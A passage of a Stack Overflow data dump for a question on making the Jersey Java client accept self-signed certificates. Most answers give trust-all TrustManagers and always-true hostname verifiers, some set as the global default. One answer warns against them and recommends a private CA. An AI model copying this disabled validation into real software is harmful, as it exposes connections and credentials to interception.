forget to remove this sort of code when you have a deadline, since it doesn&#39;t show up as a problem.\r\n\r\nIf you&#39;re worried about having to add new certificates every time you have a test server, create your own little CA, issue all the certificates for the test servers using that CA and import this CA certificate into your client trust store. (Even if you don&#39;t deal with things like online certificate revocation in a local environment, this is certainly better than using a trust manager that lets anything through.)\r\n\r\nThere are tools to help you do this, for example [TinyCA](https://opsec.eu/src/tinyca/) or [XCA](http://xca.sourceforge.net/).","title":"Ignore self-signed ssl cert using Jersey Client","body":"<blockquote>\n<p>This code will only ever be run against test servers so I don't want\nto go to the hassle of adding new trusted certs each time we set up a\nnew test server.</p>\n</blockquote>\n<p>This is the kind of code that will eventually find its way in production (if not from you, someone else who's reading this question will copy and paste the insecure trust managers that have been suggested into their applications). It's just so easy to forget to remove this sort of code when you have a deadline, since it doesn't show up as a problem.</p>\n<p>If you're worried about having to add new certificates every time you have a test server, create your own little CA, issue all the certificates for the test servers using that CA and import this CA certificate into your client trust store. (Even if you don't deal with things like online certificate revocation in a local environment, this is certainly better than using a trust manager that lets anything through.)</p>\n<p>There are tools to help you do this, for example <a href=\"https://opsec.eu/src/tinyca/\" rel=\"nofollow noreferrer\">TinyCA</a> or <a href=\"http://xca.sourceforge.net/\" rel=\"nofollow noreferrer\">XCA</a>.</p>\n"},{"tags":[],"owner":{"account_id":2150868,"reputation":3882,"user_id":1907282,"display_name":"Marcelo C."},"down_vote_count":1,"up_vote_count":3,"is_accepted":false,"score":2,"last_activity_date":1455638394,"creation_date":1410358291,"answer_id":25767673,"question_id":6047996,"body_markdown":"For Jersey 2.*:\r\n\r\n    Client client = ClientBuilder.newBuilder()\r\n    \t\t\t\t.hostnameVerifier(new HostnameVerifier() {\r\n    \t\t\t\t\t@Override\r\n    \t\t\t\t\tpublic boolean verify(String hostname, SSLSession session) {\r\n    \t\t\t\t\t\treturn true;\r\n    \t\t\t\t\t}\r\n    \t\t\t\t}).build();\r\n\r\n\r\n-&gt; https://jersey.java.net/documentation/latest/migration.html","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>For Jersey 2.*:</p>\n\n<pre><code>Client client = ClientBuilder.newBuilder()\n                .hostnameVerifier(new HostnameVerifier() {\n                    @Override\n                    public boolean verify(String hostname, SSLSession session) {\n                        return true;\n                    }\n                }).build();\n</code></pre>\n\n<p>-> <a href=\"https://jersey.java.net/documentation/latest/migration.html\" rel=\"nofollow\">https://jersey.java.net/documentation/latest/migration.html</a></p>\n"},{"tags":[],"owner":{"account_id":3219539,"reputation":293,"user_id":2717308,"display_name":"Mukesh"},"down_vote_count":0,"up_vote_count":9,"is_accepted":false,"score":9,"last_activity_date":1640255653,"creation_date":1418207806,"answer_id":27398820,"question_id":6047996,"body_markdown":"Since I am new to stackoverflow and have lesser reputation to comment on others&#39; answers, I am putting the solution suggested by Chris Salij with some modification which worked for me.\r\n\r\n\tSSLContext ctx = null;\r\n\tTrustManager[] trustAllCerts = new X509TrustManager[]{new X509TrustManager(){\r\n\t\tpublic X509Certificate[] getAcceptedIssuers(){return null;}\r\n\t\tpublic void checkClientTrusted(X509Certificate[] certs, String authType){}\r\n\t\tpublic void checkServerTrusted(X509Certificate[] certs, String authType){}\r\n\t}};\r\n\ttry {\r\n\t\tctx = SSLContext.getInstance(&quot;SSL&quot;);\r\n\t\tctx.init(null, trustAllCerts, null);\r\n\t} catch (NoSuchAlgorithmException | KeyManagementException e) {\r\n\t\tLOGGER.info(&quot;Error loading ssl context {}&quot;, e.getMessage());\r\n\t}\r\n\t\r\n\tSSLContext.setDefault(ctx);","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>Since I am new to stackoverflow and have lesser reputation to comment on others' answers, I am putting the solution suggested by Chris Salij with some modification which worked for me.</p>\n<pre><code>SSLContext ctx = null;\nTrustManager[] trustAllCerts = new X509TrustManager[]{new X509TrustManager(){\n    public X509Certificate[] getAcceptedIssuers(){return null;}\n    public void checkClientTrusted(X509Certificate[] certs, String authType){}\n    public void checkServerTrusted(X509Certificate[] certs, String authType){}\n}};\ntry {\n    ctx = SSLContext.getInstance(&quot;SSL&quot;);\n    ctx.init(null, trustAllCerts, null);\n} catch (NoSuchAlgorithmException | KeyManagementException e) {\n    LOGGER.info(&quot;Error loading ssl context {}&quot;, e.getMessage());\n}\n\nSSLContext.setDefault(ctx);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3103675,"reputation":1315,"user_id":2627101,"display_name":"eitan"},"down_vote_count":1,"up_vote_count":83,"is_accepted":false,"score":82,"last_activity_date":1516096802,"creation_date":1426513138,"answer_id":29078257,"question_id":6047996,"body_markdown":"For Jersey 2.* (Tested on 2.7) and java 8:\r\n\r\n    import java.security.cert.CertificateException; \r\n    import java.security.cert.X509Certificate; \r\n    import javax.net.ssl.SSLContext; \r\n    import javax.net.ssl.TrustManager; \r\n    import javax.net.ssl.X509TrustManager; \r\n\r\n    public static Client ignoreSSLClient() throws Exception {\r\n\r\n        SSLContext sslcontext = SSLContext.getInstance(&quot;TLS&quot;);\r\n\r\n        sslcontext.init(null, new TrustManager[]{new X509TrustManager() {\r\n            public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\r\n            public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\r\n            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\r\n        }}, new java.security.SecureRandom());\r\n\r\n        return ClientBuilder.newBuilder()\r\n                            .sslContext(sslcontext)\r\n                            .hostnameVerifier((s1, s2) -&gt; true)\r\n                            .build();\r\n    }","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>For Jersey 2.* (Tested on 2.7) and java 8:</p>\n\n<pre><code>import java.security.cert.CertificateException; \nimport java.security.cert.X509Certificate; \nimport javax.net.ssl.SSLContext; \nimport javax.net.ssl.TrustManager; \nimport javax.net.ssl.X509TrustManager; \n\npublic static Client ignoreSSLClient() throws Exception {\n\n    SSLContext sslcontext = SSLContext.getInstance(\"TLS\");\n\n    sslcontext.init(null, new TrustManager[]{new X509TrustManager() {\n        public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n        public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException {}\n        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n    }}, new java.security.SecureRandom());\n\n    return ClientBuilder.newBuilder()\n                        .sslContext(sslcontext)\n                        .hostnameVerifier((s1, s2) -&gt; true)\n                        .build();\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":3057654,"reputation":5535,"user_id":2590960,"accept_rate":54,"display_name":"grep"},"down_vote_count":1,"up_vote_count":1,"is_accepted":false,"score":0,"last_activity_date":1483003495,"creation_date":1483000426,"answer_id":41375869,"question_id":6047996,"body_markdown":"\r\nFor Jersey 1.X\r\n\r\n        TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {\r\n     \r\n\t\t\tpublic void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) throws java.security.cert.CertificateException {}\r\n\r\n\t\t\tpublic void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) throws java.security.cert.CertificateException {}\r\n\r\n\t\t\tpublic java.security.cert.X509Certificate[] getAcceptedIssuers() { \r\n                // or you can return null too\r\n\t\t\t\treturn new java.security.cert.X509Certificate[0];\r\n\t\t\t}\r\n\t\t}};\r\n\r\n\r\n\t\tSSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);\r\n\t\tsc.init(null, trustAllCerts, new SecureRandom());\r\n\t\tHttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\r\n\t\tHttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {\r\n\t\t\tpublic boolean verify(String string, SSLSession sslSession) {\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t});\r\n","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>For Jersey 1.X</p>\n\n<pre><code>    TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {\n\n        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) throws java.security.cert.CertificateException {}\n\n        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) throws java.security.cert.CertificateException {}\n\n        public java.security.cert.X509Certificate[] getAcceptedIssuers() { \n            // or you can return null too\n            return new java.security.cert.X509Certificate[0];\n        }\n    }};\n\n\n    SSLContext sc = SSLContext.getInstance(\"TLS\");\n    sc.init(null, trustAllCerts, new SecureRandom());\n    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n    HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {\n        public boolean verify(String string, SSLSession sslSession) {\n            return true;\n        }\n    });\n</code></pre>\n"},{"tags":[],"owner":{"account_id":168482,"reputation":4194,"user_id":393969,"accept_rate":80,"display_name":"omni"},"down_vote_count":0,"up_vote_count":7,"is_accepted":false,"score":7,"last_activity_date":1485539894,"creation_date":1485539894,"answer_id":41900204,"question_id":6047996,"body_markdown":"For anyone on Jersey 2.x without lambdas, use this:\r\n\r\n    import java.security.cert.CertificateException;\r\n    import java.security.cert.X509Certificate;\r\n    import javax.net.ssl.HostnameVerifier;\r\n    import javax.net.ssl.SSLContext;\r\n    import javax.net.ssl.SSLSession;\r\n    import javax.net.ssl.TrustManager;\r\n    import javax.net.ssl.X509TrustManager;\r\n    import javax.ws.rs.client.Client;\r\n    import javax.ws.rs.client.ClientBuilder;\r\n    \r\n    public static Client getUnsecureClient() throws Exception \r\n    {\r\n    \tSSLContext sslcontext = SSLContext.getInstance(&quot;TLS&quot;);\r\n    \tsslcontext.init(null, new TrustManager[]{new X509TrustManager() \r\n    \t{\r\n    \t\t\tpublic void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException{}\r\n    \t\t\tpublic void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException{}\r\n    \t\t\tpublic X509Certificate[] getAcceptedIssuers()\r\n    \t\t\t{\r\n    \t\t\t\treturn new X509Certificate[0];\r\n    \t\t\t}\r\n    \r\n    \t}}, new java.security.SecureRandom());\r\n    \t\r\n    \t\r\n    \tHostnameVerifier allowAll = new HostnameVerifier() \r\n    \t{\r\n    \t\t@Override\r\n    \t\tpublic boolean verify(String hostname, SSLSession session) {\r\n    \t\t\treturn true;\r\n    \t\t}\r\n    \t};\r\n    \t\r\n    \treturn ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(allowAll).build();\r\n    }\r\n\r\n\r\nTested with **jersey-client 2.11** on **JRE 1.7**.","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>For anyone on Jersey 2.x without lambdas, use this:</p>\n\n<pre><code>import java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport javax.ws.rs.client.Client;\nimport javax.ws.rs.client.ClientBuilder;\n\npublic static Client getUnsecureClient() throws Exception \n{\n    SSLContext sslcontext = SSLContext.getInstance(\"TLS\");\n    sslcontext.init(null, new TrustManager[]{new X509TrustManager() \n    {\n            public void checkClientTrusted(X509Certificate[] arg0, String arg1) throws CertificateException{}\n            public void checkServerTrusted(X509Certificate[] arg0, String arg1) throws CertificateException{}\n            public X509Certificate[] getAcceptedIssuers()\n            {\n                return new X509Certificate[0];\n            }\n\n    }}, new java.security.SecureRandom());\n\n\n    HostnameVerifier allowAll = new HostnameVerifier() \n    {\n        @Override\n        public boolean verify(String hostname, SSLSession session) {\n            return true;\n        }\n    };\n\n    return ClientBuilder.newBuilder().sslContext(sslcontext).hostnameVerifier(allowAll).build();\n}\n</code></pre>\n\n<p>Tested with <strong>jersey-client 2.11</strong> on <strong>JRE 1.7</strong>.</p>\n"},{"tags":[],"owner":{"account_id":1203915,"reputation":10209,"user_id":1174024,"accept_rate":85,"display_name":"Nicholas DiPiazza"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1538066989,"creation_date":1538066622,"answer_id":52541638,"question_id":6047996,"body_markdown":"I noticed that when using the Apache http client configuration with a pooling manager, the accepted answer doesn&#39;t work.\r\n\r\nIn this case it appears that the `ClientConfig.sslContext` and `ClientConfig.hostnameVerifier` setters are silently ignored. So if you are using connection pooling with the apache client http client config, you should be able to use the following code to get ssl verification to be ignored:\r\n\r\n      ClientConfig clientConfig = new ClientConfig();\r\n      // ... configure your clientConfig\r\n      SSLContext sslContext = null;\r\n      try {\r\n        sslContext = SSLContext.getInstance(&quot;SSL&quot;);\r\n        sslContext.init(null, new TrustManager[] {\r\n            new X509TrustManager() {\r\n              @Override\r\n              public void checkClientTrusted(X509Certificate[] x509Certificates, String s) {\r\n              }\r\n\r\n              @Override\r\n              public void checkServerTrusted(X509Certificate[] x509Certificates, String s) {\r\n              }\r\n\r\n              @Override\r\n              public X509Certificate[] getAcceptedIssuers() {\r\n                return new X509Certificate[] {};\r\n              }\r\n            }\r\n        }, null);\r\n      } catch (NoSuchAlgorithmException e) {\r\n        //logger.debug(&quot;Ignoring &#39;NoSuchAlgorithmException&#39; while ignoring ssl certificate validation.&quot;);\r\n      } catch (KeyManagementException e) {\r\n        //logger.debug(&quot;Ignoring &#39;KeyManagementException&#39; while ignoring ssl certificate validation.&quot;);\r\n      }\r\n      Registry&lt;ConnectionSocketFactory&gt; socketFactoryRegistry = RegistryBuilder.&lt;ConnectionSocketFactory&gt;create()\r\n          .register(&quot;http&quot;, PlainConnectionSocketFactory.getSocketFactory())\r\n          .register(&quot;https&quot;, new SSLConnectionSocketFactory(sslContext, new AbstractVerifier() {\r\n            @Override\r\n            public void verify(String host, String[] cns, String[] subjectAlts) {\r\n            }\r\n          }))\r\n          .build();\r\n      connectionManager = new PoolingHttpClientConnectionManager(socketFactoryRegistry);\r\n      clientConfig.property(ApacheClientProperties.CONNECTION_MANAGER, connectionManager);\r\n      return ClientBuilder.newClient(clientConfig);\r\n\r\n","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>I noticed that when using the Apache http client configuration with a pooling manager, the accepted answer doesn't work.</p>\n\n<p>In this case it appears that the <code>ClientConfig.sslContext</code> and <code>ClientConfig.hostnameVerifier</code> setters are silently ignored. So if you are using connection pooling with the apache client http client config, you should be able to use the following code to get ssl verification to be ignored:</p>\n\n<pre><code>  ClientConfig clientConfig = new ClientConfig();\n  // ... configure your clientConfig\n  SSLContext sslContext = null;\n  try {\n    sslContext = SSLContext.getInstance(\"SSL\");\n    sslContext.init(null, new TrustManager[] {\n        new X509TrustManager() {\n          @Override\n          public void checkClientTrusted(X509Certificate[] x509Certificates, String s) {\n          }\n\n          @Override\n          public void checkServerTrusted(X509Certificate[] x509Certificates, String s) {\n          }\n\n          @Override\n          public X509Certificate[] getAcceptedIssuers() {\n            return new X509Certificate[] {};\n          }\n        }\n    }, null);\n  } catch (NoSuchAlgorithmException e) {\n    //logger.debug(\"Ignoring 'NoSuchAlgorithmException' while ignoring ssl certificate validation.\");\n  } catch (KeyManagementException e) {\n    //logger.debug(\"Ignoring 'KeyManagementException' while ignoring ssl certificate validation.\");\n  }\n  Registry&lt;ConnectionSocketFactory&gt; socketFactoryRegistry = RegistryBuilder.&lt;ConnectionSocketFactory&gt;create()\n      .register(\"http\", PlainConnectionSocketFactory.getSocketFactory())\n      .register(\"https\", new SSLConnectionSocketFactory(sslContext, new AbstractVerifier() {\n        @Override\n        public void verify(String host, String[] cns, String[] subjectAlts) {\n        }\n      }))\n      .build();\n  connectionManager = new PoolingHttpClientConnectionManager(socketFactoryRegistry);\n  clientConfig.property(ApacheClientProperties.CONNECTION_MANAGER, connectionManager);\n  return ClientBuilder.newClient(clientConfig);\n</code></pre>\n"},{"tags":[],"owner":{"account_id":4356262,"reputation":1770,"user_id":3554774,"display_name":"xtsoler"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1554276687,"creation_date":1554275778,"answer_id":55489177,"question_id":6047996,"body_markdown":"Okay, I&#39;d like to just add my class only because there might be some dev out there in the future that wants to connect to a Netbackup server (or something similar) and do stuff from Java while ignoring the SSL cert. This worked for me and we use windows active directory for auth to the Netbackup server.\r\n\r\n\r\n\r\n    public static void main(String[] args) throws Exception {\r\n        SSLContext sslcontext = null;\r\n        try {\r\n            sslcontext = SSLContext.getInstance(&quot;TLS&quot;);\r\n        } catch (NoSuchAlgorithmException ex) {\r\n            Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);\r\n        }\r\n        try {\r\n            sslcontext.init(null, new TrustManager[]{new X509TrustManager() {\r\n                public X509Certificate[] getAcceptedIssuers() {\r\n                    return new X509Certificate[0];\r\n                }\r\n                @Override\r\n                public void checkClientTrusted(X509Certificate[] xcs, String string) throws CertificateException {\r\n                    //throw new UnsupportedOperationException(&quot;Not supported yet.&quot;); //To change body of generated methods, choose Tools | Templates.\r\n                }\r\n\r\n                @Override\r\n                public void checkServerTrusted(X509Certificate[] xcs, String string) throws CertificateException {\r\n                    //throw new UnsupportedOperationException(&quot;Not supported yet.&quot;); //To change body of generated methods, choose Tools | Templates.\r\n                }\r\n            }}, new java.security.SecureRandom());\r\n        } catch (KeyManagementException ex) {\r\n            Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);\r\n        }\r\n        //HttpAuthenticationFeature feature = HttpAuthenticationFeature.basicBuilder().credentials(username, password).build();\r\n        ClientConfig clientConfig = new ClientConfig();\r\n        //clientConfig.register(feature);\r\n        Client client = ClientBuilder.newBuilder().withConfig(clientConfig)\r\n                .sslContext(sslcontext)\r\n                .hostnameVerifier((s1, s2) -&gt; true)\r\n                .build();\r\n\r\n        //String the_url = &quot;https://the_server:1556/netbackup/security/cacert&quot;;\r\n        String the_token;\r\n        {\r\n            String the_url = &quot;https://the_server:1556/netbackup/login&quot;;\r\n            WebTarget webTarget = client.target(the_url);\r\n\r\n            Invocation.Builder invocationBuilder = webTarget.request(MediaType.APPLICATION_JSON);\r\n            String jsonString = new JSONObject()\r\n                    .put(&quot;domainType&quot;, &quot;NT&quot;)\r\n                    .put(&quot;domainName&quot;, &quot;XX&quot;)\r\n                    .put(&quot;userName&quot;, &quot;the username&quot;)\r\n                    .put(&quot;password&quot;, &quot;the password&quot;).toString();\r\n            System.out.println(jsonString);\r\n            Response response = invocationBuilder.post(Entity.json(jsonString));\r\n            String data = response.readEntity(String.class);\r\n            JSONObject jo = new JSONObject(data);\r\n            the_token = jo.getString(&quot;token&quot;);\r\n            System.out.println(&quot;token is:&quot; + the_token);\r\n\r\n        }\r\n        {\r\n            String the_url = &quot;https://the_server:1556/netbackup/admin/jobs/1122012&quot;; //job id 1122012 is an example\r\n            WebTarget webTarget = client.target(the_url);\r\n            Invocation.Builder invocationBuilder = webTarget.request(MediaType.APPLICATION_JSON).header(HttpHeaders.AUTHORIZATION, the_token).header(HttpHeaders.ACCEPT, &quot;application/vnd.netbackup+json;version=1.0&quot;);\r\n            Response response = invocationBuilder.get();\r\n            System.out.println(&quot;response status:&quot; + response.getStatus());\r\n            String data = response.readEntity(String.class);\r\n            //JSONObject jo = new JSONObject(data);\r\n            System.out.println(data);\r\n        }\r\n    }\r\nI know it can be considered off-topic, but I bet the dev that tries to connect to a Netbackup server will probably end up here. By the way many thanks to all the answers in this question!\r\nThe spec I&#39;m talking about is [here][1] and [their code samples][2] are (currently) missing a Java example.\r\n\r\n***This is of course unsafe since we ignore the cert!\r\n\r\n\r\n  [1]: https://sort.veritas.com/public/documents/nbu/8.1.1/windowsandunix/productguides/html/index/\r\n  [2]: https://github.com/VeritasOS/netbackup-api-code-samples","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>Okay, I'd like to just add my class only because there might be some dev out there in the future that wants to connect to a Netbackup server (or something similar) and do stuff from Java while ignoring the SSL cert. This worked for me and we use windows active directory for auth to the Netbackup server.</p>\n\n<pre><code>public static void main(String[] args) throws Exception {\n    SSLContext sslcontext = null;\n    try {\n        sslcontext = SSLContext.getInstance(\"TLS\");\n    } catch (NoSuchAlgorithmException ex) {\n        Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);\n    }\n    try {\n        sslcontext.init(null, new TrustManager[]{new X509TrustManager() {\n            public X509Certificate[] getAcceptedIssuers() {\n                return new X509Certificate[0];\n            }\n            @Override\n            public void checkClientTrusted(X509Certificate[] xcs, String string) throws CertificateException {\n                //throw new UnsupportedOperationException(\"Not supported yet.\"); //To change body of generated methods, choose Tools | Templates.\n            }\n\n            @Override\n            public void checkServerTrusted(X509Certificate[] xcs, String string) throws CertificateException {\n                //throw new UnsupportedOperationException(\"Not supported yet.\"); //To change body of generated methods, choose Tools | Templates.\n            }\n        }}, new java.security.SecureRandom());\n    } catch (KeyManagementException ex) {\n        Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);\n    }\n    //HttpAuthenticationFeature feature = HttpAuthenticationFeature.basicBuilder().credentials(username, password).build();\n    ClientConfig clientConfig = new ClientConfig();\n    //clientConfig.register(feature);\n    Client client = ClientBuilder.newBuilder().withConfig(clientConfig)\n            .sslContext(sslcontext)\n            .hostnameVerifier((s1, s2) -&gt; true)\n            .build();\n\n    //String the_url = \"https://the_server:1556/netbackup/security/cacert\";\n    String the_token;\n    {\n        String the_url = \"https://the_server:1556/netbackup/login\";\n        WebTarget webTarget = client.target(the_url);\n\n        Invocation.Builder invocationBuilder = webTarget.request(MediaType.APPLICATION_JSON);\n        String jsonString = new JSONObject()\n                .put(\"domainType\", \"NT\")\n                .put(\"domainName\", \"XX\")\n                .put(\"userName\", \"the username\")\n                .put(\"password\", \"the password\").toString();\n        System.out.println(jsonString);\n        Response response = invocationBuilder.post(Entity.json(jsonString));\n        String data = response.readEntity(String.class);\n        JSONObject jo = new JSONObject(data);\n        the_token = jo.getString(\"token\");\n        System.out.println(\"token is:\" + the_token);\n\n    }\n    {\n        String the_url = \"https://the_server:1556/netbackup/admin/jobs/1122012\"; //job id 1122012 is an example\n        WebTarget webTarget = client.target(the_url);\n        Invocation.Builder invocationBuilder = webTarget.request(MediaType.APPLICATION_JSON).header(HttpHeaders.AUTHORIZATION, the_token).header(HttpHeaders.ACCEPT, \"application/vnd.netbackup+json;version=1.0\");\n        Response response = invocationBuilder.get();\n        System.out.println(\"response status:\" + response.getStatus());\n        String data = response.readEntity(String.class);\n        //JSONObject jo = new JSONObject(data);\n        System.out.println(data);\n    }\n}\n</code></pre>\n\n<p>I know it can be considered off-topic, but I bet the dev that tries to connect to a Netbackup server will probably end up here. By the way many thanks to all the answers in this question!\nThe spec I'm talking about is <a href=\"https://sort.veritas.com/public/documents/nbu/8.1.1/windowsandunix/productguides/html/index/\" rel=\"nofollow noreferrer\">here</a> and <a href=\"https://github.com/VeritasOS/netbackup-api-code-samples\" rel=\"nofollow noreferrer\">their code samples</a> are (currently) missing a Java example.</p>\n\n<p>***This is of course unsafe since we ignore the cert!</p>\n"}],"owner":{"account_id":36857,"reputation":3106,"user_id":105223,"accept_rate":84,"display_name":"Chris Salij"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":214601,"favorite_count":0,"down_vote_count":1,"up_vote_count":74,"closed_date":1614075843,"accepted_answer_id":6055903,"answer_count":10,"score":73,"last_activity_date":1640255653,"creation_date":1305736344,"question_id":6047996,"body_markdown":"I&#39;m using the Jersey Client library to run tests against a rest service running on jboss.\r\nI have https set up fine on the server (running on localhost), using a self signed cert. \r\n\r\nHowever whenever I run my tests with the https url I get the following error:\r\n\r\n    com.sun.jersey.api.client.ClientHandlerException: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\r\n    \tat com.sun.jersey.client.urlconnection.URLConnectionClientHandler.handle(URLConnectionClientHandler.java:131)\r\n    \tat com.sun.jersey.api.client.Client.handle(Client.java:629)\r\n    \tat com.sun.jersey.oauth.client.OAuthClientFilter.handle(OAuthClientFilter.java:137)\r\n    \tat com.sun.jersey.api.client.WebResource.handle(WebResource.java:601)\r\n    \tat com.sun.jersey.api.client.WebResource.access$200(WebResource.java:74)\r\n    \tat com.sun.jersey.api.client.WebResource$Builder.get(WebResource.java:459)\r\n    \tat test.helper.Helper.sendSignedRequest(Helper.java:174)\r\n    \t... And so on\r\n\r\nI know this is because my self signed cert is not in the java keystore. Is there any way I can make the `Client` not check the validity of the ssl cert and just use it regardless?\r\n\r\nThis code will only ever be run against test servers so I don&#39;t want to go to the hassle of adding new trusted certs each time we set up a new test server.\r\n\r\nHere&#39;s the code which is making the call:\r\n\r\n    OAuthParameters params = new OAuthParameters();\r\n    \t\t\r\n    // baseline OAuth parameters for access to resource\r\n    params.signatureMethod(props.getProperty(&quot;signature_method&quot;));\r\n    params.consumerKey(props.getProperty(&quot;consumer_key&quot;));\r\n    params.setToken(props.getProperty(&quot;token&quot;));\r\n    params.setVersion(&quot;1.0&quot;);\r\n    params.nonce();\r\n    \t\r\n    // OAuth secrets to access resource\r\n    OAuthSecrets secrets = new OAuthSecrets();\r\n    secrets.consumerSecret(props.getProperty(&quot;consumer_secret&quot;));\r\n    secrets.setTokenSecret(props.getProperty(&quot;token_secret&quot;));\r\n    \t\r\n    // Jersey client to make REST calls to token services\r\n    Client client = Client.create();\r\n    \t\r\n    // OAuth test server resource\r\n    WebResource resource = client.resource(props.getProperty(&quot;url&quot;));\r\n    \t\t\r\n    // if parameters and secrets remain static, filter cab be added to each web resource\r\n    OAuthClientFilter filter = new OAuthClientFilter(client.getProviders(), params, secrets);\r\n    \t\r\n    // filter added at the web resource level\r\n    resource.addFilter(filter);\r\n    WebResource.Builder wbr = resource.getRequestBuilder().accept(props.getProperty(&quot;accept&quot;));\r\n    \t\t\r\n    return wbr.get(ClientResponse.class);\r\n\r\nAny help would be greatly appreciated.","title":"Ignore self-signed ssl cert using Jersey Client","body":"<p>I'm using the Jersey Client library to run tests against a rest service running on jboss.\nI have https set up fine on the server (running on localhost), using a self signed cert. </p>\n\n<p>However whenever I run my tests with the https url I get the following error:</p>\n\n<pre><code>com.sun.jersey.api.client.ClientHandlerException: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target\n    at com.sun.jersey.client.urlconnection.URLConnectionClientHandler.handle(URLConnectionClientHandler.java:131)\n    at com.sun.jersey.api.client.Client.handle(Client.java:629)\n    at com.sun.jersey.oauth.client.OAuthClientFilter.handle(OAuthClientFilter.java:137)\n    at com.sun.jersey.api.client.WebResource.handle(WebResource.java:601)\n    at com.sun.jersey.api.client.WebResource.access$200(WebResource.java:74)\n    at com.sun.jersey.api.client.WebResource$Builder.get(WebResource.java:459)\n    at test.helper.Helper.sendSignedRequest(Helper.java:174)\n    ... And so on\n</code></pre>\n\n<p>I know this is because my self signed cert is not in the java keystore. Is there any way I can make the <code>Client</code> not check the validity of the ssl cert and just use it regardless?</p>\n\n<p>This code will only ever be run against test servers so I don't want to go to the hassle of adding new trusted certs each time we set up a new test server.</p>\n\n<p>Here's the code which is making the call:</p>\n\n<pre><code>OAuthParameters params = new OAuthParameters();\n\n// baseline OAuth parameters for access to resource\nparams.signatureMethod(props.getProperty(\"signature_method\"));\nparams.consumerKey(props.getProperty(\"consumer_key\"));\nparams.setToken(props.getProperty(\"token\"));\nparams.setVersion(\"1.0\");\nparams.nonce();\n\n// OAuth secrets to access resource\nOAuthSecrets secrets = new OAuthSecrets();\nsecrets.consumerSecret(props.getProperty(\"consumer_secret\"));\nsecrets.setTokenSecret(props.getProperty(\"token_secret\"));\n\n// Jersey client to make REST calls to token services\nClient client = Client.create();\n\n// OAuth test server resource\nWebResource resource = client.resource(props.getProperty(\"url\"));\n\n// if parameters and secrets remain static, filter cab be added to each web resource\nOAuthClientFilter filter = new OAuthClientFilter(client.getProviders(), params, secrets);\n\n// filter added at the web resource level\nresource.addFilter(filter);\nWebResource.Builder wbr = resource.getRequestBuilder().accept(props.getProperty(\"accept\"));\n\nreturn wbr.get(ClientResponse.class);\n</code></pre>\n\n<p>Any help would be greatly appreciated.</p>\n"},{"tags":["java","spring","project-reactor","reactor","requestscope"],"comments":[{"owner":{"account_id":9074935,"reputation":1264,"user_id":6756858,"display_name":"ata"},"score":1,"creation_date":1640236182,"post_id":70457857,"comment_id":124548557,"body_markdown":"please provide some code or example to help others to reproduce your problem.","body":"please provide some code or example to help others to reproduce your problem."},{"owner":{"account_id":-1,"reputation":1,"user_id":-1,"display_name":"Community"},"score":0,"creation_date":1641057682,"post_id":70457857,"comment_id":124713647,"body_markdown":"Please provide enough code so others can better understand or reproduce the problem.","body":"Please provide enough code so others can better understand or reproduce the problem."}],"owner":{"account_id":21820555,"reputation":11,"user_id":16116811,"display_name":"Kratos_001"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":161,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1640255600,"creation_date":1640235912,"question_id":70457857,"body_markdown":"Not able to use request scoped bean in a reactor code. Facing the below exception\r\n```\r\norg.springframework.beans.factory.BeanCreationException: \r\nError creating bean with name &#39;scopedTarget.eventProcessor&#39;: Scope &#39;request&#39; is not active for the current thread; consider defining a scoped proxy for this bean if you intend to refer to it from a singleton;\r\n```\r\nnested exception is `java.lang.IllegalStateException:` \r\n```\r\nNo thread-bound request found: \r\nAre you referring to request attributes outside of an actual web request, or processing a request outside of the originally receiving thread? \r\nIf you are actually operating within a web request and still receive this message, your code is probably running outside of DispatcherServlet: In this case, use RequestContextListener or 